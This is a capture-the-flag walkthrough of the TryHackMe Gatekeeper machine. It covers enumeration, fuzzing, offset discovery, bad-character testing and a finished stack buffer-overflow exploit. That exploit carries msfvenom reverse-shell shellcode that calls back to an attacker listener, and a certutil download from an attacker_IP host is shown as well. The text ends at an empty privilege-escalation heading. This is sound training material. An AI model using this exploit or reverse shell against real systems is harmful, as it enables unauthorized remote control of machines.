# Gatekeeper

## Enumeration

Run your nmap scan to see what ports are available:

```shell
kali@kali:~/THM/gatekeeper$ sudo nmap -sS -sV -sC -Pn 10.10.160.113       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 14:49 EST
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 14:50 (0:00:00 remaining)
Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 30.00% done; ETC: 14:52 (0:00:28 remaining)
Nmap scan report for 10.10.160.113
Host is up (0.20s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-11-20T19:54:35+00:00; -26s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2024-11-20T19:54:29+00:00
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2024-11-19T19:48:55
|_Not valid after:  2025-05-21T19:48:55
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94SVN%I=7%D=11/20%Time=673E3DF7%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n
SF:")%r(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello
SF:\x20Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:
SF:nm@nm>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call
SF:-ID:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-
SF:Forwards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Cont
SF:act:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHel
SF:lo\x20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r
SF:(HTTPOptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!
SF:!\n")%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\
SF:x20\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\
SF:x20\x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLS
SF:SessionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r
SF:(FourOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%
SF:2ebak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x
SF:01default!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!
SF:!\n");
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 59m34s, deviation: 2h14m10s, median: -26s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-20T14:54:29-05:00
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:7e:43:80:29:ad (unknown)
| smb2-time: 
|   date: 2024-11-20T19:54:29
|_  start_date: 2024-11-20T19:48:53
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 348.95 seconds

```

List available shares available on port 445 with smblcient:

![[smb access.png]]

Access "Users" with the following command:

```shell
smbclient \\\\Target_IP\\Users
```
***Note: When it asks for a password just click enter***

CD to "Share" and use mget to download "gatekeeper.exe"

![[mget executable.png]]

## Testing executable

I just want to see what it does and interact with it so I have a better understanding of how to exploit it. 

I transferred the executable to my Flare VM using x32dbg for analysis.
***Later I will have to use the 'Buffer Overflow Prep' box on THM because it's a Windows7 VM - I'll explain that later***
## Buffer Overflow Analysis and Exploit Development

### Setup x32dbg
Go to ***options --> preferences --> events tab***
Un-check all options:

![[setup x32dbg.png]]

Press "ctrl + F2" to restart the executable with the new preferences.
## Manual Buffer Overflow Testing

The executable accepts user input, but it has a relatively small buffer that can overflow when exceeded, so I had to do some manual testing to figure out exactly where the offset occurs. I don't know that this is the most efficient way to do this, as I'm still pretty new to BOF and binary exploitation in general, but this is how I did it.

### **Step 1: Initial Fuzzing Script**

We start with a basic fuzzing script that incrementally increases the size of the payload sent to the target program. This helps us identify the approximate size of the vulnerable buffer. Run the following script from your attack machine:

```python
# import the libraries we’ll need
import socket,time,sys

# set up our target info
ip = "local_target_IP"   # change this to whatever your target IP is in your local debugger (mine is running in a Flare VM)
port = 31337         # target port service is running on - found in nmap results

# our initial buffer payload will be 100 ‘A’ characters; it will get bigger later
string = "A" * 100

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.settimeout(5)
     s.connect((ip, port))   # establish a connection

     # keep trying incrementally larger strings until it crashes
     while True:
          try:
               print("Fuzzing {} bytes...".format(len(string)))
               s.send(bytes(string,"latin-1"))    # sends our 'message'
               s.recv(1024)

          except:
               print("Fuzzing crashed at {} bytes!!!".format(len(string)))
               sys.exit(0)    # if we crashed the service, we’re done here

          string += "A" * 100    # if it didn’t crash, increase our buffer and try again
          time.sleep(1)
```

**Observations**: When running this script, you’ll notice that the connection crashes after 100 bytes, but the program itself doesn’t terminate. This indicates that while the buffer is being overrun, we haven’t yet overwritten critical program execution elements like the EIP.

### **Step 2: Narrowing the Crash Point**

To pinpoint where the actual overflow occurs, we modify our script to increment the payload in smaller steps and allow manual restarts of the program after each attempt.

```python

import socket
import time

# Target details
target_ip = "local_target_IP"
target_port = 31337

# Incrementing range
start_length = 100
end_length = 200  # Test up to 200 bytes
step = 2  # Increment by 2 bytes

for length in range(start_length, end_length + 1, step):
    try:
        # Create payload of incrementing size
        payload = b"A" * length

        print(f"Sending payload of {length} bytes...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.send(payload + b"\r\n")  # Ensure proper line ending

            # Receive response (if any)
            response = s.recv(1024)
            print(f"Response: {response.decode(errors='ignore')}")

        print(f"Sent {length} bytes. Restart the target program and press Enter to continue...")
        input()  # Pause for manual restart of the program

    except Exception as e:
        print(f"Failed with {length} bytes: {e}")
        break
```

**Key Notes**:

- **Incrementing by 2 bytes**: This ensures more precise identification of the crash point without taking too long.
- **Manual restarts**: After each attempt, restart the program in the debugger (e.g., by pressing **Ctrl + F2** in x32dbg).
- **Line endings (`\r\n`)**: The script sends an extra carriage return and newline, which the executable requires to accept input. This adds 2 bytes to the total payload size, so remember to account for it when analyzing results. Then press enter in your attack machine's command line to send the next incremented payload. 

**Expected Outcome**: Using this method, you’ll eventually find the exact buffer size where the program crashes and begins overwriting critical registers like the EIP. For example, you may find that the buffer crashes at **146 bytes (144 `A`s + 2 bytes `\r\n`)**, but the EIP isn’t overwritten until **150 bytes**.


![[tedious manual testing.png]]

***This part is tedious, so I'm going to skip ahead and give you the answer***

After sending 150 bytes, the EIP is fully overwritten, as you will see below:

![[EIP overwrite 41.png]]

### **Step 3: Verifying the Offset:**

Now that we know the **EIP (Extended Instruction Pointer)** is fully overwritten at 150 bytes, we can calculate that the **offset** is 146 bytes. This means the first 146 bytes of our payload will fill up the buffer, and the 4 bytes immediately after that will overwrite the EIP.

The goal of this step is to verify that our assumption about the offset is correct. We'll do this by sending 146 `A`s (hex value `41`) followed by 4 `B`s (hex value `42`) to the program. If the offset is correct, the **EIP** in the debugger (e.g., x32dbg) should display `42424242` (the hex representation of 4 `B`s).

This process ensures that we know exactly where in our payload the EIP overwrite occurs, so we can later replace those 4 `B`s with a memory address that will redirect program execution.

---
##### **Why Are We Doing This?**

1. **Buffer Overflow Basics**:  
    When a program has a buffer overflow vulnerability, extra data can overwrite important parts of the program's memory, like the **EIP**. The **EIP** determines where the program executes next. By controlling it, we can control the program's execution.
    
2. **The Offset**:  
    The offset is the exact number of bytes we need to send before we start overwriting the **EIP**. This ensures that we overwrite only the **EIP** (and nothing else) with our desired value.
    
3. **Testing the Offset**:  
    By sending `146 A`s followed by `4 B`s, we can confirm that:
    
    - The first 146 bytes fill the buffer.
    - The next 4 bytes overwrite the **EIP** with `42424242`.

---
##### **Modified Fuzzer Script**

Below is the script we'll use to test the offset:

```python
import socket  # For network communication

# Target details
ip = 'local_target_IP'  # Change this to the target's IP
port = 31337          # Port the service is running on

# Buffer structure
offset = 146  # Number of bytes to fill the buffer
overflow = b'A' * offset  # Fills the buffer with 'A's (hex 41)

# Empty retn and payload for now; we'll add these later
retn = b''

# Padding: Used to overwrite the EIP (4 'B's = hex 42)
padding = b'BBBB'

# Final payload (will grow later)
payload = b''

# Combine all parts into one buffer
buffer = overflow + retn + padding + payload

try:
    # Create a connection to the target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the buffer to the target
    print(f"Sending buffer of {len(buffer)} bytes...")
    s.send(buffer + b'\r\n')  # Add '\r\n' (required line ending for the program)
    print("Buffer sent!")

    # Optional: Receive server response (if any)
    response = s.recv(1024)
    print(f"Server response: {response.decode(errors='ignore')}")

    s.close()  # Close the connection

except Exception as e:
    print(f"Could not connect to the target: {e}")
```

---
##### **Offset Test**

1. **Run the Script**:  
    Save the script above as `test_offset.py` and run it on your attack machine:
    
    ```
    python3 test_offset.py
    ```
    
2. **Observe the Debugger**:
    
    - In your debugger (e.g., x32dbg), look at the **EIP** register after the program crashes.
    - If the offset is correct, the **EIP** should display `42424242` (4 `B`s in hex).


![[Overwritten EIP B.png]]


---
### **Alternative Approach to Verify Offset**

Instead of manually incrementing payload sizes to determine the offset, you can use Metasploit tools like `msf-pattern_create` and `msf-pattern_offset`. These tools generate and analyze a unique cyclic pattern, making it easier to pinpoint exactly where the buffer overflow occurs.

---

#### **Step 1: Create a Cyclic Pattern**

Use the `msf-pattern_create` command to generate a unique pattern of characters. In this case, we’ll create a 150-byte pattern because we know the buffer overflow begins at 150 bytes.

```shell
msf-pattern_create -l 150
```

- **`-l`**: Specifies the length of the pattern.
- **150**: This is the payload length we chose to ensure the pattern overwrites the EIP.

This will output something like:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

This pattern is unique, meaning each sequence of characters corresponds to a specific offset in the buffer.

---

#### **Step 2: Update Your Script**

Replace the `overflow` section in your script with the cyclic pattern. For this step, we are testing only the overflow, so you can leave the `retn` and `payload` empty.

```python
import socket
ip = 'local_target_IP'  # Change to your target's IP
port = 31337            # Target port (from your nmap results)

# Use the cyclic pattern generated by msf-pattern_create
overflow = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'

retn = b''    # Leave empty for now
payload = b'' # Add later when crafting the final exploit
buffer = overflow + retn + payload

try:
    # Connect to the target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the buffer
    print(f"Sending buffer of {len(buffer)} bytes...")
    s.send(buffer + b'\r\n')  # Add the required line ending
    print("Buffer sent!")

    # Optional: Receive server response (if any)
    response = s.recv(1024)
    print(f"Server response: {response.decode(errors='ignore')}")

    s.close()

except Exception as e:
    print(f"Could not connect to the target: {e}")
```

---

#### **Step 3: Find the Offset**

Run your updated script and examine the **EIP** value in your debugger (e.g., x32dbg or Immunity Debugger). The **EIP** should now contain part of the cyclic pattern. For example, you might see something like this in the **EIP** register:

```
39654138
```

This value corresponds to a specific position in the cyclic pattern. Right click EIP and copy the value.

![[cyclic EIP test.png]]

To determine the exact offset where the overflow occurred, use the `msf-pattern_offset` tool:

```shell
msf-pattern_offset -q 39654138 -l 150
```

- **`-q`**: The value found in the **EIP** (e.g., `39654138`).
- **`-l`**: The total length of the pattern you created (150 in this case).

The tool will output the exact offset, e.g.:

```
[+] Exact match at offset 146
```

This confirms that the offset is **146 bytes**.

---
##### **Why Is This Useful?**

1. **Accuracy**: This approach eliminates guesswork and ensures precise identification of the offset.
2. **Efficiency**: It’s faster and requires less trial and error than manually increasing buffer sizes.
3. **Reusability**: You can use this method in other buffer overflow challenges.

---
### **Testing Bad Characters**


When testing for bad characters, the goal is to determine which characters cause issues when sent to the target. These bad characters can corrupt or truncate the payload, breaking the exploit. Here’s how to systematically test for them:

---
#### **Step 1: Create a List of Bad Characters**

You can generate a list of all possible characters (except `\x00`, which is typically bad by default) using Python:

```python
>>> badchars = ''.join('\\x{:02x}'.format(x) for x in range(1, 256))
>>> print(badchars)
```

---
#### **Step 2: Update the Script to Send the Bad Characters**

Add the list of characters as the payload in a simple exploit script. Here’s an example:

***test_badchars.py***:
```python
import socket
ip = 'target_IP''
port = 31337             #Target port service is running on

offset = 146
overflow = b'A' * offset

#Leave empty until you verify badchars and find valid jmp esp
retn = b''

#Used for actual exploit padding
padding = b''

#Find badchars by using following as "payload"
#badchars = b"".join([bytes([x]) for x in range(1, 256) if x not in [0x00, 0x0A, 0x0D]])
#payload = badchars 

payload = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

#encoded_payload = payload.encode('latin1')

# Construct the buffer
buffer = overflow + retn + padding + payload
try:
    # Connect to the target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the buffer
    print(f"Sending buffer of {len(buffer)} bytes...")
    s.send(buffer + b'\r\n')  # Add the line ending required by the program
    print("Buffer sent!")

    # Optional: Receive server response
    response = s.recv(1024)
    print(f"Server response: {response.decode(errors='ignore')}")

    s.close()

except Exception as e:
    print(f"Could not connect to the target: {e}")

```

---
#### **Step 3: Analyze the Memory**

1. **Inspect the Stack**: After sending the payload, examine the memory at the address pointed to by the **ESP** register in your debugger (e.g., x32dbg, Immunity Debugger).

![[follow badchars in dump.png]]
    
2. **Compare the Sequence**: Look at the memory dump starting from the **ESP** pointer. The bad characters should appear sequentially. If you see:
    
    - A character missing
    - A character replaced (e.g., `\x00` instead of `\x0A`)
    - Truncated sequences
    
    This indicates that the corresponding character is a bad character.
    

---
#### **Example Analysis**

Here’s an example memory dump:

```
009C19D4  01 02 03 04 05 06 07 08 09 00 0B 0C 0D 0E 0F 10  ................
009C19E4  11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20  ............. 
009C19F4  21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  !"#$%&'()*+,-./0
```

- The sequence starts cleanly with `\x01, \x02, \x03...`.
- After `\x09`, you see a `\x00`. This indicates that `\x0A` is likely a bad character (caused by truncation or interpretation by the program).
- The sequence resumes after `\x0B`.

---
#### **What to Look For**

1. Missing characters in the sequence.
2. Replaced characters (e.g., `\x00` or `!` instead of the expected value).
3. Patterns breaking or sequences not continuing as expected.

---
#### **Actual Analysis**
- The first place you should notice a break in the pattern is after "09" - the next expected character is "0a" but the pattern is broken by "212121".
- The next place you should notice a break in the pattern is again after "09" - the next expected character is "0a" but the pattern is broken by "00" and then continues on with the rest of the pattern. 

![[break in bad characters.png]]

#### **3. Why did the pattern break after `\x09`?**

The break after `\x09`  is likely due to **special handling of control characters** (`\x09`, `\x0A`, `\x0D`, etc.):

- **`\x09`**: Tab character.
- **`\x0A`**: Line feed (`\n`).
- **`\x0D`**: Carriage return (`\r`).

What does that mean for us? These are likely bad characters that we can remove from out list.

#### **Step 4: Iterate and Refine**

Remove bad characters from your list and re-test:

```python
>>> badchars = ''.join('\\x{:02x}'.format(x) for x in range(1, 256) if x not in [0x00, 0x0A, 0x0D])
>>> print(badchars)
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

```

Replace your payload in test_badchars.py script and repeat the process until the memory dump contains no breaks or replacements, confirming the safe characters.

The result should look like this:

![[unbroken payload badchar test.png]]

## Finding The JMP ESP

This section takes a slight detour to address an issue with address layouts. While debugging the executable in Flare VM (Windows 10) using x32dbg, the `JMP ESP` address I found did not align with the address layout of the THM target (Windows 7). To resolve this, I uploaded the executable to the **THM Buffer Overflow Prep Box** and used Immunity Debugger to find the correct `JMP ESP` address.

---

### **Step 1: Upload the Executable to the THM Box**

1. **Start the THM Buffer Overflow Prep Box**:
    
    - Navigate to the [Buffer Overflow Prep room](https://tryhackme.com/r/room/bufferoverflowprep) and start the machine.
    - Use the provided credentials to RDP into the box:
        - **Username**: `admin`
        - **Password**: `password`
2. **Connect via RDP**:
    
    - Use your preferred RDP client (e.g., Remmina). 
    - Click the "+" in the top left hand corner to add a connection
    - Enter the machine's IP, username, and password - save and connect.
    - Accept the certificate prompt if prompted.
    - Select "home network" and close the pop-up.
    
![[remmina setup.png]]

3. **Transfer the Executable**:
    
    - On your attack machine, start a Python HTTP server in the directory containing `gatekeeper.exe`:
        
        ```bash
        python3 -m http.server 80
        ```
        
    - On the THM box, open an elevated Command Prompt
    - Click the start menu, search for "cmd", right click and run as administrator to open an elevated cmd prompt.
    - Type the following:
    ```
    cd C:\Users\admin\Desktop
    ```
    
    - Download the file using `certutil`:
        
        ```cmd
        certutil -urlcache -f http://attacker_IP:80/gatekeeper.exe gatekeeper.exe
        ```
        
    - Verify the file is saved on the desktop.

You can close the cmd prompt window. 

### **Step 2: Debug the Executable in Immunity Debugger**

1. **Load the Program**:
    
    - Open **Immunity Debugger** and load `gatekeeper.exe`:
        - Click **File -> Open**, navigate to the admin's desktop, and select `gatekeeper.exe`.
        ![[immunity debugger.png]]
1. **Start the Program**:
    
    - Press **F9** to start the program.
3. **Crash the Program**:
    
    - Send your latest ***test_badchars.py*** payload to the THM Buffer Overflow Prep Box’s IP.
    - The program will crash, and Immunity Debugger will pause execution.
    ![[Immunity badchars crash.png]]

### **Step 3: Find the JMP ESP Address**

1. **Run the `mona` Command**:
    
    - Use the Mona plugin to find a `JMP ESP` instruction:
        
        ```cmd
        !mona jmp -r esp -cbp "\x00\x0a\x0d"
        ```
        
    - **Explanation**:
        - `-r esp`: Search for `JMP ESP`.
        - `-cbp "\x00\x0a\x0d"`: Exclude bad characters.
2. **Review the Results**:
    
    - Open the **Log Data** window in Immunity (via **Window -> Log Data**).
    - Copy one of the valid addresses found by Mona.
3. **Convert the Address to Little Endian**:
    
    - Mona outputs the address in Big Endian (e.g., `080414C3`).
    - Right click and copy one of the addresses.
    - Convert it to Little Endian for your exploit:
        
        ```bash
        Big Endian:  080414C3  
        Little Endian: \xc3\x14\x04\x08
        ```
        ![[jmp esp in immunity.png]]
        ![[jmp address.png]]

Now we're done with Immunity and this Windows 7 VM, so you can close remmina, and terminate the BOF Prep machine and restart the Gatekeeper machine.
### **Step 4: Update and Test the Exploit**

1. **Update the Exploit Script**:
    
    - Add the Little Endian version of the `JMP ESP` address to the `retn` variable:
        
        ```python
        retn = b'\xc3\x14\x04\x08'
        ```
        
    - Add padding for stack alignment using NOP sleds:
        
        ```python
        padding = b'\x90' * 16
        ```
        
2. **Generate a Payload**:
    
    - Use `msfvenom` to create a reverse shell payload:
        
    ```bash
msfvenom -p windows/shell_reverse_tcp LHOST=your_tun0_IP LPORT=4445 -b '\x00\x0a\x0d' EXITFUNC=thread -f python | grep -oP '(?<=b").*(?=")' | tr -d '\n' | awk '{print "payload = b\"" $0 "\""}'
        ```
        
    
    - This command will create a neatly formatted payload that directs a reverse tcp connection to your kali machine. Make sure to run `ifconfig` to get the IP given to you by THM (likely a 10.x.x.x address running on tun0 interface). 
    - Copy the generated payload and add it to your script.
    - Your script should look something like this:
***exploit.py***
```python
import socket
ip = 'gatekeeper_IP'
port = 31337             #Target port service is running on

offset = 146
overflow = b'A' * offset
retn = b'\xc3\x14\x04\x08'
padding = b'\x90' * 16
payload = b"\xbe\x3f\x26\xe4\xd4\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\x4d\x28\x06\x21\x4d\xdc\x44\xca\xad\x1d\x29\x42\x48\x2c\x69\x30\x19\x1f\x59\x32\x4f\xac\x12\x16\x7b\x27\x56\xbf\x8c\x80\xdd\x99\xa3\x11\x4d\xd9\xa2\x91\x8c\x0e\x04\xab\x5e\x43\x45\xec\x83\xae\x17\xa5\xc8\x1d\x87\xc2\x85\x9d\x2c\x98\x08\xa6\xd1\x69\x2a\x87\x44\xe1\x75\x07\x67\x26\x0e\x0e\x7f\x2b\x2b\xd8\xf4\x9f\xc7\xdb\xdc\xd1\x28\x77\x21\xde\xda\x89\x66\xd9\x04\xfc\x9e\x19\xb8\x07\x65\x63\x66\x8d\x7d\xc3\xed\x35\x59\xf5\x22\xa3\x2a\xf9\x8f\xa7\x74\x1e\x11\x6b\x0f\x1a\x9a\x8a\xdf\xaa\xd8\xa8\xfb\xf7\xbb\xd1\x5a\x52\x6d\xed\xbc\x3d\xd2\x4b\xb7\xd0\x07\xe6\x9a\xbc\xe4\xcb\x24\x3d\x63\x5b\x57\x0f\x2c\xf7\xff\x23\xa5\xd1\xf8\x44\x9c\xa6\x96\xba\x1f\xd7\xbf\x78\x4b\x87\xd7\xa9\xf4\x4c\x27\x55\x21\xc2\x77\xf9\x9a\xa3\x27\xb9\x4a\x4c\x2d\x36\xb4\x6c\x4e\x9c\xdd\x07\xb5\x77\x6d\x23\x69\x11\x19\xce\x91\x0f\x87\x47\x77\x45\x27\x0e\x20\xf2\xde\x0b\xba\x63\x1e\x86\xc7\xa4\x94\x25\x38\x6a\x5d\x43\x2a\x1b\xad\x1e\x10\x8a\xb2\xb4\x3c\x50\x20\x53\xbc\x1f\x59\xcc\xeb\x48\xaf\x05\x79\x65\x96\xbf\x9f\x74\x4e\x87\x1b\xa3\xb3\x06\xa2\x26\x8f\x2c\xb4\xfe\x10\x69\xe0\xae\x46\x27\x5e\x09\x31\x89\x08\xc3\xee\x43\xdc\x92\xdc\x53\x9a\x9a\x08\x22\x42\x2a\xe5\x73\x7d\x83\x61\x74\x06\xf9\x11\x7b\xdd\xb9\x32\x9e\xf7\xb7\xda\x07\x92\x75\x87\xb7\x49\xb9\xbe\x3b\x7b\x42\x45\x23\x0e\x47\x01\xe3\xe3\x35\x1a\x86\x03\xe9\x1b\x83"


# Construct the buffer
buffer = overflow + retn + padding + payload
try:
    # Connect to the target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the buffer
    print(f"Sending buffer of {len(buffer)} bytes...")
    s.send(buffer + b'\r\n')  # Add the line ending required by the program
    print("Buffer sent!")

    # Optional: Receive server response
    response = s.recv(1024)
    print(f"Server response: {response.decode(errors='ignore')}")

    s.close()

except Exception as e:
    print(f"Could not connect to the target: {e}")

```

### **Why This Works**

Using the THM Buffer Overflow Prep Box ensures the address layout matches the intended target (Windows 7). This approach avoids inconsistencies caused by address layout differences between debugging environments like Flare VM (Windows 10) and the THM target.

## Gaining Access

This is the moment of truth - we're going to test the exploit against the THM server. 

1. Start a listener on your attack machine on a port of your choice (I'm using 4445)
```
nc -lvnp 4445 
```

2. Send the exploit
```
python3 exploit.py
```

![[send exploit.png]]

You should receive a connection back. The user flag is easy pickings from here.

![[initial connection and user flag.png]]

## Privilege Escalation
### **Enumeration**

